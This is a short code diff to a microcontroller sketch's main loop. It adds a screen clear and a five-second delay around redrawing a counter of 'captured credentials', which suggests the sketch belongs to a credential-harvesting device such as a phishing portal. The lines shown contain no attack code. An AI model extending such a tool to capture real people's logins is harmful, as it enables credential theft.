@@ -199,11 +199,12 @@ void loop() {
   if ((millis() - lastTick) > TICK_TIMER) {
 
     lastTick = millis();
-
+    DISPLAY.fillScreen(BLACK);
     if (totalCapturedCredentials != previousTotalCapturedCredentials) {
       previousTotalCapturedCredentials = totalCapturedCredentials;
 
       printHomeToScreen();
+      delayMicroseconds(5000000);
     }
   }
 
